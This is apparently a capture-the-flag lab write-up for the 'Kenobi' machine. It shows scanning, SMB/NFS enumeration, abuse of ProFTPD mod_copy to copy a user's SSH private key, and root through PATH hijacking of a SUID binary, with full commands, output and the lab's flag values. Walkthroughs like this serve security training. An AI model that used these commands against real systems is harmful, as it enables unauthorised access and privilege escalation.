# kenobi

IP = `10.10.76.229`


## NMAP

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100021  1,3,4      37781/tcp6  nlockmgr
|_  100021  1,3,4      41352/udp6  nlockmgr
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2024-09-04T04:50:29
|_  start_date: N/A
|_clock-skew: mean: 1h40m01s, deviation: 2h53m13s, median: 1s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-09-03T23:50:29-05:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```


### smbclient

`smbclient -NL 10.10.76.229`

```

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KENOBI

```

#### List smb shares

```
$ smbclient //10.10.76.229/anonymous
Password for [WORKGROUP\vagrant]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877108 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (6.5 KiloBytes/sec) (average 6.5 KiloBytes/sec)
smb: \>

```

#### List nfs shares to mount

`$ /usr/sbin/showmount -e 10.10.76.229`

```
Export list for 10.10.76.229:
/var *
```

### Searchsploit (proftpd 1.3.5)

```
$ searchsploit proftpd 1.3.5
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                 | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                       | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                   | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                 | linux/remote/36742.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

## Initial Foothold

> The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

> We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

```
$ nc 10.10.76.229 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.76.229]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful


```


Lets mount the /var/tmp directory to our machine
![](https://i.imgur.com/v8Ln4fu.png)

```
mkdir /mnt/kenobiNFS
mount 10.10.76.229:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

`cp /mnt/var/tmp/id_rsa /home/kali/kenobi/`
`chmod 600 id_rsa`
`ssh -i id_rsa kenobi@10.10.201.29`

Got User!

**User Flag**

`d0b0f3f53b6caa532a83915e19224899`

## Privilege Escaltion

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6

```

`/usr/bin/menu` stand out

Strings is a command on Linux that looks for human readable strings on a binary.

```
kenobi@kenobi:~$ strings /usr/bin/menu
`--SNIP--
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
--SNIP--

```
This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
As this file runs as the root users privileges, we can manipulate our path gain a root shell.


```
kenobi@kenobi:/tmp$ ls -la /usr/bin/menu
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu

kenobi@kenobi:~$ cd /tmp/
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH

```

exploit

```
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# 

```

Got Root!

**Root Flag**
`177b3cd8562289f37382721c28381f02`